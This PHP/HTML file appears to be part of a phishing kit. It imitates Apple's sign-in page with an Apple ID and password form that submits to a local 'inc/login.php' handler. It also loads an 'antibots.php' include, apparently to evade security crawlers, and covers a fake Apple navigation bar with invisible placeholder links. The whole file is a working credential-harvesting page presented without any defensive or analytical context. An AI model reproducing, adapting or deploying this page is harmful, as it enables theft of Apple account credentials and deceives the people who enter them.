<?php
require "antibots.php";

?>
<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>Sign in  - Apple</title>
	<link rel="icon" type="image/ico" href="images/favicon.ico" />
<link href="css/index.css" rel="stylesheet">

<form action="inc/login.php" required="required" method="post" class="" name="login" >
</head>
<body>
<div id="wb_Bookmark1" style="position:absolute;left:537px;top:859px;width:45px;height:18px;z-index:0">
<a id="Bookmark1" style="visibility:hidden">&nbsp;</a>
</div>
<input type="email" id="Editbox1" style="position:absolute;left:513px;top:280px;width:316px;height:32px;line-height:32px;z-index:1;" required="required"
 name="appid" value="" placeholder=" Apple ID" size="1">
<input type="password" id="Editbox2" style="position:absolute;left:513px;top:321px;width:316px;height:31px;line-height:31px;z-index:2;" required="required" name="pwd0" value="" placeholder=" Password" size="1">
<input type="checkbox" id="Checkbox1" name="" value="on" style="position:absolute;left:616px;top:378px;z-index:3;">
<input type="submit" id="Button1" name="" value="" style="position:absolute;left:791px;top:324px;width:33px;height:34px;z-index:4;">
<div style="position: absolute; width: 182px; height: 25px; z-index: 5; left: 586px; top: 433px" id="forgot password
1">
<a href="#"><img border="0" src="images/blank.gif" width="184" height="25"></a></div>
<div style="position: absolute; width: 50px; height: 25px; z-index: 5; left: 1130px; top: 5px" id="myaccount
0">
<a href="#"><img border="0" src="images/blank.gif" width="50" height="25"></a></div>
<div style="position: absolute; width: 50px; height: 25px; z-index: 5; left: 1040px; top: 5px" id="serch
">
<a href="#"><img border="0" src="images/blank.gif" width="50" height="25"></a></div>
<div style="position: absolute; width: 59px; height: 25px; z-index: 5; left: 924px; top: 5px" id="support">
<a href="#"><img border="0" src="images/blank.gif" width="59" height="25"></a></div>
<div style="position: absolute; width: 50px; height: 25px; z-index: 6; left: 807px; top: 4px" id="music">
<a href="#"><img border="0" src="images/blank.gif" width="50" height="25"></a></div>
<div style="position: absolute; width: 50px; height: 25px; z-index: 5; left: 705px; top: 5px" id="tv">
<a href="#"><img border="0" src="images/blank.gif" width="50" height="25"></a></div>
<div style="position: absolute; width: 50px; height: 25px; z-index: 7; left: 601px; top: 5px" id="watch">
<a href="#"><img border="0" src="images/blank.gif" width="50" height="25"></a></div>
<div style="position: absolute; width: 50px; height: 25px; z-index: 8; left: 482px; top: 5px" id="iphone">
<a href="#"><img border="0" src="images/blank.gif" width="50" height="25"></a></div>
<div style="position: absolute; width: 50px; height: 25px; z-index: 9; left: 370px; top: 5px" id="ipad">
<a href="#"><img border="0" src="images/blank.gif" width="50" height="25"></a></div>
<div style="position: absolute; width: 50px; height: 25px; z-index: 10; left: 267px; top: 5px" id="mac">
<a href="#"><img border="0" src="images/blank.gif" width="50" height="25"></a></div>
<div style="position: absolute; width: 50px; height: 25px; z-index: 11; left: 170px; top: 5px" id="applelog">
<p><a href="#"><img border="0" src="images/blank.gif" width="50" height="25"></a></div>
</body>
</html>